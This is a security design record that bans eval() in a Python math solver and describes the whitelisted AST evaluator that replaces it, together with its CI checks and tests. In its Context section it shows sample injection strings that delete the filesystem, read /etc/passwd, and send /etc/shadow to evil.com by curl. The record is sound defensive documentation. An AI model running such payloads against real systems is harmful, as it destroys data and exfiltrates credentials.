# ADR-003: No eval()

**Status:** Accepted  
**Date:** 2026-07-23  
**Deciders:** Gowtham Sangadi (Ghias)

## Context

The original AXIMA math solver used Python's `eval()` to compute mathematical expressions:

```python
# DANGEROUS — original code
result = eval(user_expression)  # Arbitrary code execution!
```

This is a critical security vulnerability (T001 in our threat model). A user can execute arbitrary Python code:

```python
# Malicious inputs that eval() happily executes:
eval("__import__('os').system('rm -rf /')")
eval("open('/etc/passwd').read()")
eval("__import__('subprocess').call(['curl', 'evil.com', '-d', open('/etc/shadow').read()])")
```

## Decision

**`eval()`, `exec()`, and `compile()` are permanently banned from all AXIMA code paths.**

Mathematical evaluation uses a safe AST-based evaluator that only supports numeric operations.

## Safe Math AST Alternative

The replacement (`src/axima/security/safe_math.py`) works by:

### 1. Tokenization

Parse the expression string into typed tokens (numbers, operators, function names, parentheses). Reject any token that isn't in the whitelist.

### 2. AST Construction

Build a typed abstract syntax tree where every node is one of:
- `NumberNode` — literal numeric value
- `BinaryOpNode` — `+`, `-`, `*`, `/`, `**`, `%`
- `UnaryOpNode` — unary `-`, `+`
- `FunctionCallNode` — whitelisted functions only

### 3. Evaluation

Walk the AST and compute results. At each step, enforce:
- **Value bounds:** Results must be in [-1e308, 1e308]
- **Recursion depth:** Max 100 levels
- **Exponent magnitude:** `a**b` rejects if `b > 1000`
- **Division by zero:** Returns structured error, not exception

### 4. Whitelisted Functions

Only these functions are available:

```
sin, cos, tan, asin, acos, atan, atan2
sinh, cosh, tanh
sqrt, cbrt, abs, floor, ceil, round
log, log2, log10, ln, exp
min, max, gcd, lcm
factorial, comb, perm
pi, e, tau, inf
```

Any function not in this list produces a structured error.

### Example

```python
from axima.security.safe_math import MathEvaluator

evaluator = MathEvaluator()

# Safe — returns result
evaluator.evaluate("2 + 3 * sin(pi/4)")  # → 4.121...

# Blocked — not a math function
evaluator.evaluate("__import__('os')")    # → EvalError: unknown function '__import__'

# Blocked — exceeds bounds
evaluator.evaluate("2**2**100")           # → EvalError: exponent too large

# Blocked — unknown token
evaluator.evaluate("open('file')")        # → EvalError: unknown function 'open'
```

## Security Implications

### What eval() Allows (All Blocked Now)

| Attack Vector | Impact | Status |
|---------------|--------|--------|
| Code injection via math input | Full system compromise | MITIGATED |
| File system access via expressions | Data exfiltration | MITIGATED |
| Network access via expressions | C2 communication | MITIGATED |
| Process spawning via expressions | Privilege escalation | MITIGATED |
| Memory exhaustion via expressions | Denial of service | MITIGATED |

### Defense in Depth

Even if the safe evaluator had a bug, additional layers protect:

1. **Input validation** — InputShield rejects suspicious patterns before reaching evaluator
2. **Sandbox** — If somehow code executes, it runs in an isolated subprocess
3. **Resource limits** — Time and memory bounds prevent exhaustion
4. **Network deny** — No outbound connections possible

## Enforcement

### Static Analysis

The CI pipeline runs:

```bash
# Fails if eval/exec/compile found in source
ruff check --select S307 src/  # S307 = use of eval
grep -rn "eval\s*(" src/ && exit 1
grep -rn "exec\s*(" src/ && exit 1
grep -rn "compile\s*(" src/ && exit 1
```

### Runtime Detection

The security module monkey-patches `builtins.eval` in test mode to raise immediately if called, catching any indirect usage through libraries.

### Test Coverage

`tests/security/test_safe_math.py` contains:
- Positive tests (valid expressions compute correctly)
- Injection tests (all known injection vectors rejected)
- Bounds tests (oversized expressions, deep nesting rejected)
- Fuzzing tests (random string inputs don't crash)

## Alternatives Considered

| Alternative | Rejected Because |
|-------------|-----------------|
| `ast.literal_eval()` | Only handles literals, not expressions |
| `numexpr` library | External dependency, unclear security boundary |
| `sympy.sympify()` | Calls eval internally in some code paths |
| Subprocess + restricted Python | Complex, still has escape vectors |
| Custom interpreter in sandbox | Overkill for math evaluation |

The AST evaluator is the right balance: simple, auditable, fast, and provably safe (the whitelist is finite and inspectable).
